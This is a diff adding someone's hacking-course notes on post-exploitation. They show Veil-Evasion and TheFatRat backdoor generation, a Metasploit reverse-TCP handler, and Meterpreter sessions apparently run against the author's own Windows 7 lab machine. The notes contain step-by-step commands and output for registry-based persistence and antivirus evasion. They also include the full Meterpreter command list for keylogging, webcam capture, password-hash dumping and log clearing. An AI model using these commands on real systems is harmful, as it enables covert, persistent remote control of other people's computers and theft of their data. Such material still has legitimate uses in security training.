@@ -1184,9 +1184,555 @@ Indirect - Google Analytics - Setoolkit
 - Go youtube page, view page source, take google analytic data
 - Open Setoolkit in Kali
 
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Post Exploitation Part (1)
+-------------------------
+
+"Maintaining access to target computer"
+
+(3) Post Exploitation
+--------------------
+- Using Veil Evasion
+- Using Persistence module
+- Using Metasploit + Veil Evasion
+
+Using Veil Evasion
+-----------------
+- Rev_http_service
+- Rev_tcp_service
+- Use it instead of a normal back door
+- or Upload and execute from Meterpreter
+* Does not always work
+
+> sudo veil
+> use 1
+> list
+
+===============================================================================
+                                   Veil-Evasion
+===============================================================================
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+===============================================================================
 
 
+ [*] Available Payloads:                                                                                                  
+                                                                                                                          
+        1)      autoit/shellcode_inject/flat.py
 
+        2)      auxiliary/coldwar_wrapper.py
+        3)      auxiliary/macro_converter.py
+        4)      auxiliary/pyinstaller_wrapper.py
+
+        5)      c/meterpreter/rev_http.py
+        6)      c/meterpreter/rev_http_service.py
+        7)      c/meterpreter/rev_tcp.py
+        8)      c/meterpreter/rev_tcp_service.py
+
+        9)      cs/meterpreter/rev_http.py
+        10)     cs/meterpreter/re
+
+Using Persistence module
+-----------------------
+- Type this command (run persistence -h) in meterpreter
+* Detectable by anti-virus programs
+
+Using Metasploit + Veil Evasion
+------------------------------
+- Type the following commands in meterpreter
+
+> use exploit/windows/local/persistence
+> show options
+> set EXENAME browser.exe
+> set SESSION session_id
+> show advanced
+> set EXE::Custom back_door_file_location
+> exploit
+
+* More robust + Un-detectable by anti-virus programs
+
+"Generate Back Door in Fat Rat"
+ 
+  Generate Backdoor                                                                                                       
+  +------------++-------------------------++-----------------------+                                                      
+  | Name       ||  Descript               || Your Input                                                                   
+  +------------++-------------------------++-----------------------+                                                      
+  | LHOST      ||  The Listen Addres      || 192.168.97.4                                                                 
+  | LPORT      ||  The Listen Ports       || 6969                                                                         
+  | OUTPUTNAME ||  The Filename output    || backdoor_6969                                                                
+  | PAYLOAD    ||  Payload To Be Used     || windows/meterpreter/reverse_tcp                                              
+  +------------++-------------------------++-----------------------+                      
+
+Backdoor Saved To : /root/Fatrat_Generated/backdoor_6969.bat
+
+"Open terminal"
+
+> msfconsole
+> help
+> use exploit/multi/handler
+>> show option
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (generic/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.97.4     yes       The listen address (an interface may be specified)
+   LPORT  8080             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+>> set PAYLOAD windows/meterpreter/reverse_https
+>> exploit
+
+meterpreter > sysinfo
+
+Computer        : ZAWMOEHTIKE-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+meterpreter > help
+
+Core Commands
+=============
+
+    Command                   Description
+    -------                   -----------
+    ?                         Help menu
+    background                Backgrounds the current session
+    bg                        Alias for background
+    bgkill                    Kills a background meterpreter script
+    bglist                    Lists running background scripts
+    bgrun                     Executes a meterpreter script as a background thread
+    channel                   Displays information or control active channels
+    close                     Closes a channel
+    disable_unicode_encoding  Disables encoding of unicode strings
+    enable_unicode_encoding   Enables encoding of unicode strings
+    exit                      Terminate the meterpreter session
+    get_timeouts              Get the current session timeout values
+    guid                      Get the session GUID
+    help                      Help menu
+    info                      Displays information about a Post module
+    irb                       Open an interactive Ruby shell on the current session
+    load                      Load one or more meterpreter extensions
+    machine_id                Get the MSF ID of the machine attached to the session
+    migrate                   Migrate the server to another process
+    pivot                     Manage pivot listeners
+    pry                       Open the Pry debugger on the current session
+    quit                      Terminate the meterpreter session
+    read                      Reads data from a channel
+    resource                  Run the commands stored in a file
+    run                       Executes a meterpreter script or Post module
+    secure                    (Re)Negotiate TLV packet encryption on the session
+    sessions                  Quickly switch to another session
+    set_timeouts              Set the current session timeout values
+    sleep                     Force Meterpreter to go quiet, then re-establish session.
+    transport                 Change the current transport mechanism
+    use                       Deprecated alias for "load"
+    uuid                      Get the UUID for the current session
+    write                     Writes data to a channel
+
+
+Stdapi: File system Commands
+============================
+
+    Command       Description
+    -------       -----------
+    cat           Read the contents of a file to the screen
+    cd            Change directory
+    checksum      Retrieve the checksum of a file
+    cp            Copy source to destination
+    del           Delete the specified file
+    dir           List files (alias for ls)
+    download      Download a file or directory
+    edit          Edit a file
+    getlwd        Print local working directory
+    getwd         Print working directory
+    lcd           Change local working directory
+    lls           List local files
+    lpwd          Print local working directory
+    ls            List files
+    mkdir         Make directory
+    mv            Move source to destination
+    pwd           Print working directory
+    rm            Delete the specified file
+    rmdir         Remove directory
+    search        Search for files
+    show_mount    List all mount points/logical drives
+    upload        Upload a file or directory
+
+
+Stdapi: Networking Commands
+===========================
+
+    Command       Description
+    -------       -----------
+    arp           Display the host ARP cache
+    getproxy      Display the current proxy configuration
+    ifconfig      Display interfaces
+    ipconfig      Display interfaces
+    netstat       Display the network connections
+    portfwd       Forward a local port to a remote service
+    resolve       Resolve a set of host names on the target
+    route         View and modify the routing table
+
+
+Stdapi: System Commands
+=======================
+
+    Command       Description
+    -------       -----------
+    clearev       Clear the event log
+    drop_token    Relinquishes any active impersonation token.
+    execute       Execute a command
+    getenv        Get one or more environment variable values
+    getpid        Get the current process identifier
+    getprivs      Attempt to enable all privileges available to the current process
+    getsid        Get the SID of the user that the server is running as
+    getuid        Get the user that the server is running as
+    kill          Terminate a process
+    localtime     Displays the target system local date and time
+    pgrep         Filter processes by name
+    pkill         Terminate processes by name
+    ps            List running processes
+    reboot        Reboots the remote computer
+    reg           Modify and interact with the remote registry
+    rev2self      Calls RevertToSelf() on the remote machine
+    shell         Drop into a system command shell
+    shutdown      Shuts down the remote computer
+    steal_token   Attempts to steal an impersonation token from the target process
+    suspend       Suspends or resumes a list of processes
+    sysinfo       Gets information about the remote system, such as OS
+
+
+Stdapi: User interface Commands
+===============================
+
+    Command        Description
+    -------        -----------
+    enumdesktops   List all accessible desktops and window stations
+    getdesktop     Get the current meterpreter desktop
+    idletime       Returns the number of seconds the remote user has been idle
+    keyboard_send  Send keystrokes
+    keyevent       Send key events
+    keyscan_dump   Dump the keystroke buffer
+    keyscan_start  Start capturing keystrokes
+    keyscan_stop   Stop capturing keystrokes
+    mouse          Send mouse events
+    screenshare    Watch the remote user desktop in real time
+    screenshot     Grab a screenshot of the interactive desktop
+    setdesktop     Change the meterpreters current desktop
+    uictl          Control some of the user interface components
+
+
+Stdapi: Webcam Commands
+=======================
+
+    Command        Description
+    -------        -----------
+    record_mic     Record audio from the default microphone for X seconds
+    webcam_chat    Start a video chat
+    webcam_list    List webcams
+    webcam_snap    Take a snapshot from the specified webcam
+    webcam_stream  Play a video stream from the specified webcam
+
+
+Stdapi: Audio Output Commands
+=============================
+
+    Command       Description
+    -------       -----------
+    play          play a waveform audio file (.wav) on the target system
+
+
+Priv: Elevate Commands
+======================
+
+    Command       Description
+    -------       -----------
+    getsystem     Attempt to elevate your privilege to that of local system.
+
+
+Priv: Password database Commands
+================================
+
+    Command       Description
+    -------       -----------
+    hashdump      Dumps the contents of the SAM database
+
+
+Priv: Timestomp Commands
+========================
+
+    Command       Description
+    -------       -----------
+    timestomp     Manipulate file MACE attributes
+
+meterpreter > pwd
+
+C:\Users\zawmoehtike\Downloads
+
+meterpreter > dir
+
+Listing: C:\Users\zawmoehtike\Downloads
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100777/rwxrwxrwx  7268  fil   2021-06-07 22:58:35 -0400  backdoor_6969.bat
+100666/rw-rw-rw-  282   fil   2021-05-17 23:06:11 -0400  desktop.ini
+
+meterpreter > background
+
+[*] Backgrounding session 1...
+
+>> sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                  Connection
+  --  ----  ----                     -----------                                  ----------
+  1         meterpreter x86/windows  zawmoehtike-pc\zawmoehtike @ ZAWMOEHTIKE-PC  192.168.97.4:6969 -> 192.168.97.3:49190 (192.168.97.3)
+
+>> sessions -i 1
+
+[*] Starting interaction with 1...
+
+meterpreter > dir
+
+Listing: C:\Users\zawmoehtike\Downloads
+=======================================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+100777/rwxrwxrwx  7268  fil   2021-06-07 22:58:35 -0400  backdoor_6969.bat
+100666/rw-rw-rw-  282   fil   2021-05-17 23:06:11 -0400  desktop.ini
+
+meterpreter > download backdoor_6969.bat
+
+[*] Downloading: backdoor_6969.bat -> /home/zawmoehtike/backdoor_6969.bat
+[*] Downloaded 7.10 KiB of 7.10 KiB (100.0%): backdoor_6969.bat -> /home/zawmoehtike/backdoor_6969.bat
+[*] download   : backdoor_6969.bat -> /home/zawmoehtike/backdoor_6969.bat
+
+meterpreter > execute -f file_name.exe
+
+"Maintaining access to target"
+
+meterpreter > run persistence -h
+
+[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
+[!] Example: run exploit/windows/local/persistence OPTION=value [...]
+Meterpreter Script for creating a persistent backdoor on a target host.
+
+OPTIONS:
+
+    -A        Automatically start a matching exploit/multi/handler to connect to the agent
+    -L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
+    -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
+    -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
+    -T <opt>  Alternate executable template to use
+    -U        Automatically start the agent when the User logs on
+    -X        Automatically start the agent when the system boots
+    -h        This help menu
+    -i <opt>  The interval in seconds between each connection attempt
+    -p <opt>  The port on which the system running Metasploit is listening
+    -r <opt>  The IP of the system running Metasploit listening for the connect back
+
+meterpreter > run persistence -U -i 20 -p 6969 -r 192.168.97.4
+
+[!] Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
+[!] Example: run exploit/windows/local/persistence OPTION=value [...]
+[*] Running Persistence Script
+[*] Resource file for cleanup created at /home/zawmoehtike/.msf4/logs/persistence/ZAWMOEHTIKE-PC_20210607.4101/ZAWMOEHTIKE-PC_20210607.4101.rc
+[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=192.168.97.4 LPORT=6969
+[*] Persistent agent script is 99702 bytes long
+[+] Persistent Script written to C:\Users\ZAWMOE~1\AppData\Local\Temp\wdFuTJka.vbs
+[*] Executing script C:\Users\ZAWMOE~1\AppData\Local\Temp\wdFuTJka.vbs
+[+] Agent executed with PID 2956
+[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\sEaOhzJlkImgl
+[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\sEaOhzJlkImgl
+
+meterpreter > background
+
+>> use exploit/windows/local/persistence
+
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+
+>> show options
+
+Module options (exploit/windows/local/persistence):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   DELAY     10               yes       Delay (in seconds) for persistent payload to keep reconnecting back.
+   EXE_NAME                   no        The filename for the payload to be used on the target host (%RAND%.exe by default).
+   PATH                       no        Path to write payload (%TEMP% by default).
+   REG_NAME                   no        The name to call registry value for persistence on target host (%RAND% by default).
+   SESSION                    yes       The session to run this module on.
+   STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)
+   VBS_NAME                   no        The filename to use for the VBS persistent script on the target host (%RAND% by default).
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.97.4     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+   **DisablePayloadHandler: True   (no handler will be created!)**
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows
+
+>> sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                  Connection
+  --  ----  ----                     -----------                                  ----------
+  2         meterpreter x86/windows  zawmoehtike-pc\zawmoehtike @ ZAWMOEHTIKE-PC  192.168.97.4:6969 -> 192.168.97.3:49194 (192.168.97.3)
+
+>> set EXE_NAME browser.exe
+>> set SESSION 2
+>> show advanced
+
+Module advanced options (exploit/windows/local/persistence):
+
+   Name                    Current Setting  Required  Description
+   ----                    ---------------  --------  -----------
+   ContextInformationFile                   no        The information file that contains context information
+   DisablePayloadHandler   true             no        Disable the handler code for the selected payload
+   EXE::Custom                              no        Use custom exe instead of automatically generating a payload exe
+   EXE::EICAR              false            no        Generate an EICAR file instead of regular payload exe
+   EXE::FallBack           false            no        Use the default template in case the specified one is missing
+   EXE::Inject             false            no        Set to preserve the original EXE function
+   EXE::OldMethod          false            no        Set to use the substitution EXE generation method.
+   EXE::Path                                no        The directory in which to look for the executable template
+   EXE::Template                            no        The executable template file name.
+   EXEC_AFTER              false            no        Execute persistent script after installing.
+   EnableContextEncoding   false            no        Use transient context when encoding payloads
+   HANDLER                 false            no        Start an exploit/multi/handler job to receive the connection
+   MSI::Custom                              no        Use custom msi instead of automatically generating a payload msi
+   MSI::EICAR              false            no        Generate an EICAR file instead of regular payload msi
+   MSI::Path                                no        The directory in which to look for the msi template
+   MSI::Template                            no        The msi template file name
+   MSI::UAC                false            no        Create an MSI with a UAC prompt (elevation to SYSTEM if accepted)
+   VERBOSE                 false            no        Enable detailed status messages
+   WORKSPACE                                no        Specify the workspace for this module
+   WfsDelay                0                no        Additional delay when waiting for a session
+
+
+Payload advanced options (windows/meterpreter/reverse_tcp):
+
+   Name                         Current Setting  Required  Description
+   ----                         ---------------  --------  -----------
+   AutoLoadStdapi               true             yes       Automatically load the Stdapi extension
+   AutoRunScript                                 no        A script to run automatically on session creation.
+   AutoSystemInfo               true             yes       Automatically capture system information on initialization.
+   AutoUnhookProcess            false            yes       Automatically load the unhook extension and unhook the process
+   AutoVerifySession            true             yes       Automatically verify and drop invalid sessions
+   AutoVerifySessionTimeout     30               no        Timeout period to wait for session validation to occur, in seconds
+   EnableStageEncoding          false            no        Encode the second stage payload
+   EnableUnicodeEncoding        false            yes       Automatically encode UTF-8 strings as hexadecimal
+   HandlerSSLCert                                no        Path to a SSL certificate in unified PEM format, ignored for HTTP transports
+   InitialAutoRunScript                          no        An initial script to run on session creation (before AutoRunScript)
+   PayloadBindPort                               no        Port to bind reverse tcp socket to on target system.
+   PayloadProcessCommandLine                     no        The displayed command line that will be used by the payload
+   PayloadUUIDName                               no        A human-friendly name to reference this unique payload (requires tracking)
+   PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value for the UUID
+   PayloadUUIDSeed                               no        A string to use when generating the payload UUID (deterministic)
+   PayloadUUIDTracking          false            yes       Whether or not to automatically register generated UUIDs
+   PingbackRetries              0                yes       How many additional successful pingbacks
+   PingbackSleep                30               yes       Time (in seconds) to sleep between pingbacks
+   PrependMigrate               false            yes       Spawns and runs shellcode in new process
+   PrependMigrateProc                            no        Process to spawn and run shellcode in
+   ReverseAllowProxy            false            yes       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
+   ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
+   ReverseListenerBindPort                       no        The port to bind to on the local system if different from LPORT
+   ReverseListenerComm                           no        The specific communication channel to use for this listener
+   ReverseListenerThreaded      false            yes       Handle every connection in a new thread (experimental)
+   SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
+   SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
+   SessionRetryTotal            3600             no        Number of seconds try reconnecting for on network failure
+   SessionRetryWait             10               no        Number of seconds to wait between reconnect attempts
+   StageEncoder                                  no        Encoder to use if EnableStageEncoding is set
+   StageEncoderSaveRegisters                     no        Additional registers to preserve in the staged payload if EnableStageEncoding is set
+   StageEncodingFallback        true             no        Fallback to no encoding if the selected StageEncoder is not compatible
+   StagerRetryCount             10               no        The number of times the stager should retry if the first connect fails
+   StagerRetryWait              5                no        Number of seconds to wait for the stager between reconnect attempts
+   VERBOSE                      false            no        Enable detailed status messages
+   WORKSPACE                                     no        Specify the workspace for this module
+
+>> set EXE::Custom /var/www/html/evil-files/backdoor_6969.bat
+>> show advanced
+>> exploit
+
+[*] Running persistent module against ZAWMOEHTIKE-PC via session ID: 2
+[*] Using custom payload /var/www/html/evil-files/backdoor_6969.bat, no handler will be created!
+[+] Persistent VBS script written on ZAWMOEHTIKE-PC to C:\Users\ZAWMOE~1\AppData\Local\Temp\eJmCaiQcfQyoE.vbs
+[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\uqsFjwXZARubN
+[+] Installed autorun on ZAWMOEHTIKE-PC as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\uqsFjwXZARubN
+[*] Clean up Meterpreter RC file: /home/zawmoehtike/.msf4/logs/persistence/ZAWMOEHTIKE-PC_20210607.5749/ZAWMOEHTIKE-PC_20210607.5749.rc
+
+>> sessions
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                  Connection
+  --  ----  ----                     -----------                                  ----------
+  2         meterpreter x86/windows  zawmoehtike-pc\zawmoehtike @ ZAWMOEHTIKE-PC  192.168.97.4:6969 -> 192.168.97.3:49194 (192.168.97.3)
+
+>> sessions -K
+
+[*] Killing all sessions...
+[*] 192.168.97.3 - Meterpreter session 2 closed.
+
+>> sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+>> use exploit/multi/handler
+
+"Restart target computer"
+
+"* Use rev_http instead of rev_tcp for payload back door"
+
+>> exploit
+
+[*] Started reverse TCP handler on 192.168.97.4:6969 
+[*] Sending stage (175174 bytes) to 192.168.97.3
+[*] Meterpreter session 3 opened (192.168.97.4:6969 -> 192.168.97.3:49165) at 2021-06-08 00:03:24 -0400
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Post Exploitation Part (2)
+-------------------------
 
 
 
